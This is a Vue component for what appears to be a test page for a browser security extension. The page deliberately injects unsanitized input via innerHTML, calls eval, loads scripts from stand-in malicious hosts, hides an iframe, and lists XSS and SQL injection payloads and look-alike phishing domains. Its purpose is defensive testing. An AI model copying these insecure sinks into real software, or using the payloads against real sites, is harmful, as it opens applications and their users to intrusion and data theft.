<script setup lang="ts">
import { onMounted, ref } from 'vue'

const xssInput1 = ref('')
const xssInput2 = ref('')
const xssInput3 = ref('')
const obfuscatedCode = ref('')
const trackerStatus = ref<string[]>([])

function testXSS1() {
  const payload = xssInput1.value.trim()
  console.log('XSS测试1 - 输入内容:', payload)
  if (!payload) return
  document.body.insertAdjacentHTML('beforeend', payload)
}

function testXSS2() {
  const payload = xssInput2.value.trim()
  console.log('XSS测试2 - 输入内容:', payload)
  if (!payload) return
  const wrapper = document.createElement('div')
  wrapper.innerHTML = payload
  document.body.appendChild(wrapper)
}

function testXSS3() {
  const payload = xssInput3.value.trim()
  console.log('XSS测试3 - 输入内容:', payload)
  if (!payload) return
  const wrapper = document.createElement('div')
  wrapper.innerHTML = payload
  document.body.appendChild(wrapper)
}

function testEval() {
  console.log('测试 eval() 调用')
  try {
    // eslint-disable-next-line no-eval
    eval('console.log("eval executed")')
  } catch (error) {
    console.error('eval() 被阻止:', error)
  }
}

function testFunctionConstructor() {
  console.log('测试 Function() 构造函数')
  try {
    const fn = new Function('console.log("Function executed")')
    fn()
  } catch (error) {
    console.error('Function() 被阻止:', error)
  }
}

function testSetTimeoutString() {
  console.log('测试 setTimeout(string) 调用')
  // eslint-disable-next-line @typescript-eslint/no-implied-eval
  setTimeout('console.log("setTimeout executed")', 100)
}

function testSQLInjection(event: Event) {
  event.preventDefault()
  const form = event.target as HTMLFormElement | null
  if (!form) return false
  const formData = new FormData(form)
  console.group('SQL注入测试 - 表单数据:')
  for (const [key, value] of formData.entries()) {
    console.log(`  ${key}: ${value}`)
  }
  console.groupEnd()
  alert('表单提交被阻止 - 插件应检测到潜在SQL注入')
  return false
}

function testSensitiveData(event: Event) {
  event.preventDefault()
  const form = event.target as HTMLFormElement | null
  if (!form) return false
  const formData = new FormData(form)
  console.group('敏感信息测试 - 提交数据:')
  for (const [key, value] of formData.entries()) {
    console.log(`  ${key}: ${value}`)
  }
  console.groupEnd()
  alert('检测到敏感信息提交 - 插件应发出警告')
  return false
}

function injectMaliciousScript() {
  const script = document.createElement('script')
  script.textContent = `
    // 这是一个模拟的可疑脚本
    eval('console.log("malicious code executed")')
    document.cookie = 'session=stolen-data'
  `
  document.body.appendChild(script)
  console.log('已注入可疑脚本片段')
}

function injectExternalScript() {
  const script = document.createElement('script')
  script.src = 'http://evil-domain.test/malware.js'
  script.onerror = () => {
    console.warn('外部恶意脚本加载失败或被阻止')
  }
  document.body.appendChild(script)
  console.log('尝试加载外部恶意脚本')
}

function testObfuscatedCode() {
  const code = obfuscatedCode.value.trim()
  if (!code) return
  console.log('检测混淆代码样本:', code.substring(0, 120) + '...')
  alert('代码已提交检测，请查看控制台输出')
}

function updateTrackerStatus(message: string) {
  const timestamp = new Date().toLocaleTimeString()
  trackerStatus.value.push(`${timestamp} - ${message}`)
}

function loadTracker(url: string, success: string, blocked: string) {
  const script = document.createElement('script')
  script.src = url
  script.onload = () => updateTrackerStatus(success)
  script.onerror = () => updateTrackerStatus(blocked)
  document.head.appendChild(script)
}

function loadGoogleAnalytics() {
  loadTracker(
    'https://www.google-analytics.com/analytics.js',
    'Google Analytics 加载成功（未被阻止）',
    'Google Analytics 被阻止 ✓'
  )
}

function loadFacebookPixel() {
  loadTracker(
    'https://connect.facebook.net/en_US/fbevents.js',
    'Facebook Pixel 加载成功（未被阻止）',
    'Facebook Pixel 被阻止 ✓'
  )
}

function loadMixpanel() {
  loadTracker(
    'https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js',
    'Mixpanel 加载成功（未被阻止）',
    'Mixpanel 被阻止 ✓'
  )
}

function openMaliciousUrl(url: string) {
  console.log('恶意URL访问测试 - 尝试打开:', url)
  window.open(url, '_blank', 'noopener')
}

function fetchMaliciousResource(url: string) {
  console.log('恶意URL访问测试 - 尝试请求:', url)
  fetch(url, { mode: 'no-cors' })
    .then(() => updateTrackerStatus(`已发出对 ${url} 的可疑请求`))
    .catch((error) => console.warn('请求被阻止或失败:', error))
}

function injectMaliciousIframe(url: string) {
  const iframe = document.createElement('iframe')
  iframe.src = url
  iframe.style.display = 'none'
  document.body.appendChild(iframe)
  console.log('注入隐藏iframe以模拟驱动下载:', url)
}

onMounted(() => {
  console.log('%c🛡️ Web Security Guardian 测试页面已加载', 'color: #667eea; font-size: 16px; font-weight: bold')
  console.log('本页面包含多种危险行为模拟场景，仅用于本地安全测试。请勿在生产环境部署。')
})
</script>

<template>
  <main class="page">
    <div class="container">
      <h1>🛡️ Web Security Guardian</h1>
      <p class="subtitle">浏览器安全插件综合危险行为测试页</p>

      <div class="info">
        <strong>测试说明：</strong> 本页面包含多个高风险场景，仅供本地或受控环境下测试安全插件拦截能力。
        请勿在真实生产环境或未授权网络中使用。
      </div>

      <section class="test-section">
        <h2>恶意URL访问测试 <span class="status testing">Testing</span></h2>
        <div class="test-item">
          <h3>1. 模拟驱动下载</h3>
          <p>尝试访问常见恶意下载地址，插件应提前阻止或提示用户风险。</p>
          <button class="danger" @click="openMaliciousUrl('http://malware-test.invalid/drive-by-download.exe')">
            打开恶意下载链接
          </button>
          <button class="danger" @click="fetchMaliciousResource('http://malware-test.invalid/payload.js')">
            尝试静默请求恶意脚本
          </button>
          <button class="danger" @click="injectMaliciousIframe('http://exploit-kit.invalid/landing')">
            注入隐藏iframe
          </button>
          <p class="warning">所有域名均为示例，请根据需要替换为内部测试域。切勿指向真实恶意站点。</p>
        </div>
      </section>

      <section class="test-section">
        <h2>XSS攻击检测测试 <span class="status testing">Testing</span></h2>
        <div class="test-item">
          <h3>2. Script标签注入</h3>
          <p>尝试输入 <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> 等脚本。</p>
          <input v-model="xssInput1" placeholder="在此输入恶意payload..." />
          <button @click="testXSS1">触发Script注入</button>
        </div>
        <div class="test-item">
          <h3>3. 事件处理器注入</h3>
          <p>尝试输入 <code>&lt;img src=x onerror="alert('XSS')"&gt;</code>。</p>
          <input v-model="xssInput2" placeholder="测试onerror事件..." />
          <button @click="testXSS2">触发事件注入</button>
        </div>
        <div class="test-item">
          <h3>4. JavaScript伪协议</h3>
          <p>尝试输入 <code>&lt;a href="javascript:alert('XSS')"&gt;点击&lt;/a&gt;</code>。</p>
          <input v-model="xssInput3" placeholder="测试javascript:协议..." />
          <button @click="testXSS3">触发协议注入</button>
        </div>
        <div class="test-item">
          <h3>5. 危险函数调用</h3>
          <button class="danger" @click="testEval">测试 eval()</button>
          <button class="danger" @click="testFunctionConstructor">测试 Function()</button>
          <button class="danger" @click="testSetTimeoutString">测试 setTimeout(string)</button>
          <p><small>安全插件应拦截或告警这些高风险 API 调用。</small></p>
        </div>
      </section>

      <section class="test-section">
        <h2>SQL注入检测测试</h2>
        <div class="test-item">
          <h3>6. 表单SQL注入</h3>
          <p>在以下表单中输入典型SQL注入Payload，插件应在提交时阻止。</p>
          <form @submit="testSQLInjection">
            <input name="username" placeholder="用户名 (如: admin' OR '1'='1)" />
            <input name="search" placeholder="搜索 (如: '; DROP TABLE users--)" />
            <button type="submit">提交表单</button>
          </form>
          <div class="warning">
            常见测试字符串：
            <ul>
              <li><code>' OR '1'='1</code> - OR恒真条件</li>
              <li><code>'; DROP TABLE users--</code> - 删除表注入</li>
              <li><code>1' UNION SELECT * FROM users--</code> - UNION攻击</li>
              <li><code>' AND SLEEP(5)--</code> - 时间盲注</li>
            </ul>
          </div>
        </div>
      </section>

      <section class="test-section">
        <h2>敏感信息泄露检测</h2>
        <div class="test-item">
          <h3>7. 非HTTPS提交敏感数据</h3>
          <p>该表单模拟在不安全通道上传输敏感字段，插件应拦截并提示。</p>
          <form action="http://example.com/login" method="post" @submit="testSensitiveData">
            <input name="email" type="email" placeholder="邮箱: security@example.com" />
            <input name="phone" type="tel" placeholder="手机号: 13800138000" />
            <input name="id" placeholder="身份证号: 110101199001011234" />
            <input name="card" placeholder="信用卡: 4111 1111 1111 1111" />
            <button type="submit">提交敏感信息</button>
          </form>
          <p class="warning">插件应检测到敏感字段在非HTTPS环境被提交。</p>
        </div>
      </section>

      <section class="test-section">
        <h2>恶意脚本注入检测</h2>
        <div class="test-item">
          <h3>8. 动态脚本注入</h3>
          <button class="danger" @click="injectMaliciousScript">注入可疑内联脚本</button>
          <button class="danger" @click="injectExternalScript">加载外部恶意脚本</button>
          <p><small>此操作会创建动态脚本节点，插件应侦测并阻断。</small></p>
        </div>
        <div class="test-item">
          <h3>9. 混淆代码检测</h3>
          <textarea v-model="obfuscatedCode" placeholder="粘贴混淆JavaScript代码片段..."></textarea>
          <button @click="testObfuscatedCode">提交检测</button>
        </div>
      </section>

      <section class="test-section">
        <h2>第三方追踪器阻止测试</h2>
        <div class="test-item">
          <h3>10. 尝试加载常见追踪脚本</h3>
          <button @click="loadGoogleAnalytics">加载 Google Analytics</button>
          <button @click="loadFacebookPixel">加载 Facebook Pixel</button>
          <button @click="loadMixpanel">加载 Mixpanel</button>
          <p class="warning">安全插件应监控并阻断第三方追踪器。</p>
          <div class="tracker-status">
            <p
              v-for="(entry, index) in trackerStatus"
              :key="index"
              :class="{ blocked: entry.includes('被阻止') }"
            >
              {{ entry }}
            </p>
          </div>
        </div>
      </section>

      <section class="test-section">
        <h2>钓鱼网站检测测试</h2>
        <div class="test-item">
          <h3>11. 可疑链接集合</h3>
          <p>以下为模拟钓鱼域名，仅作拦截测试用，切勿点击访问生产环境。</p>
          <div class="phishing-links">
            <a href="http://paypal-secure-verify.test" target="_blank" rel="noreferrer">paypal-secure-verify.test</a>
            <a href="http://amazon-account-verify.test" target="_blank" rel="noreferrer">amazon-account-verify.test</a>
            <a href="http://google-security-check.test" target="_blank" rel="noreferrer">google-security-check.test</a>
            <a href="http://free-iphone-giveaway.test" target="_blank" rel="noreferrer">free-iphone-giveaway.test</a>
            <a href="http://bitcoin-doubler.test" target="_blank" rel="noreferrer">bitcoin-doubler.test</a>
          </div>
          <p class="warning">⚠️ 插件应在用户点击前弹出告警或阻断访问。</p>
        </div>
      </section>

      <div class="info">
        <strong>📊 调试建议：</strong>
        <ul>
          <li>使用浏览器开发者工具 (F12) 查看控制台输出与网络请求。</li>
          <li>观察插件面板中的实时拦截日志与统计。</li>
          <li>建议在独立浏览器配置文件或沙箱环境中进行演练。</li>
        </ul>
      </div>
    </div>
  </main>
</template>

<style scoped>
:global(body) {
  margin: 0;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}

.page {
  min-height: 100vh;
  box-sizing: border-box;
  padding: 24px;
  color: #333;
}

.container {
  max-width: 1180px;
  margin: 0 auto;
  background: #fff;
  border-radius: 16px;
  padding: 32px;
  box-shadow: 0 14px 40px rgba(0, 0, 0, 0.18);
}

h1 {
  color: #667eea;
  text-align: center;
  margin: 0 0 12px;
}

.subtitle {
  text-align: center;
  color: #555;
  margin: 0 0 28px;
}

.test-section {
  background: #f8f9fa;
  border-radius: 10px;
  padding: 22px;
  margin-bottom: 24px;
  border-left: 5px solid #667eea;
}

.test-section h2 {
  display: flex;
  align-items: center;
  gap: 12px;
  margin: 0 0 18px;
  color: #764ba2;
}

.status {
  display: inline-block;
  padding: 4px 12px;
  border-radius: 12px;
  font-size: 12px;
  font-weight: 600;
  color: #155724;
  background: #d4edda;
}

.status.testing {
  background: #fff3cd;
  color: #856404;
}

.test-item {
  background: #fff;
  padding: 18px;
  border-radius: 8px;
  border: 1px solid #dee2e6;
  margin-bottom: 18px;
}

.test-item:last-of-type {
  margin-bottom: 0;
}

.test-item h3 {
  margin: 0 0 10px;
  color: #495057;
  font-size: 17px;
}

button {
  background: #667eea;
  color: #fff;
  border: none;
  padding: 10px 20px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 14px;
  transition: all 0.3s;
  margin-right: 10px;
  margin-bottom: 10px;
}

button:hover {
  background: #764ba2;
  transform: translateY(-1px);
  box-shadow: 0 6px 16px rgba(102, 126, 234, 0.35);
}

button.danger {
  background: #dc3545;
}

button.danger:hover {
  background: #c82333;
}

input,
textarea {
  width: 100%;
  padding: 10px 12px;
  margin: 8px 0 12px;
  border: 1px solid #ced4da;
  border-radius: 6px;
  box-sizing: border-box;
  font-family: 'Courier New', Courier, monospace;
  font-size: 14px;
}

textarea {
  min-height: 110px;
  resize: vertical;
}

.warning {
  background: #fff3cd;
  border-left: 4px solid #ffc107;
  padding: 14px;
  border-radius: 6px;
  margin-top: 12px;
  color: #856404;
}

.info {
  background: #d1ecf1;
  border-left: 4px solid #0dcaf0;
  padding: 16px;
  border-radius: 6px;
  margin-bottom: 24px;
  color: #055160;
}

.info ul {
  margin: 10px 0 0;
  padding-left: 20px;
}

code {
  background: #f8f9fa;
  padding: 2px 6px;
  border-radius: 4px;
  color: #e83e8c;
}

.tracker-status {
  margin-top: 12px;
}

.tracker-status p {
  margin: 6px 0;
  color: #d6336c;
}

.tracker-status p.blocked {
  color: #1b5e20;
}

.phishing-links {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 10px;
  padding: 12px;
  background: #fff;
  border-radius: 6px;
  border: 1px solid #dee2e6;
}

.phishing-links a {
  color: #dc3545;
  text-decoration: none;
  word-break: break-all;
}

.phishing-links a:hover {
  text-decoration: underline;
}

@media (max-width: 768px) {
  .container {
    padding: 24px 18px;
  }

  button {
    width: 100%;
  }
}
</style>
